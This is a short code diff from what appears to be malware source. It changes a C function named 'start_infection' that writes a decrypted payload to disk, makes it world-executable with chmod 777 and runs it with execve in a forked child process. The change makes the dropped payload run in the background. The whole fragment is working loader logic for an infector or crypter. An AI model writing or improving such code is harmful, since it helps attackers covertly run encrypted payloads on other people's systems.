@@ -25,10 +25,14 @@ void start_infection(t_aes *aes, t_cipher_plain *cipher_plain, char **env)
 				fwrite(cipher_plain->plain, sizeof(char),cipher_plain->plain_len, fp);
 				fclose(fp);
 
-				chmod(EXECUTABLE, 600);
-				char *argv[] = { EXECUTABLE, 0 };
-				execve(EXECUTABLE, (char**)&argv[0], env);
+				int child_pid = fork();
 
+				if (child_pid == 0)
+				{
+					chmod(EXECUTABLE, 777);
+					char *argv[] = { EXECUTABLE, 0 };
+					execve(EXECUTABLE, (char**)&argv[0], env);
+				}
 			}
 		}
 
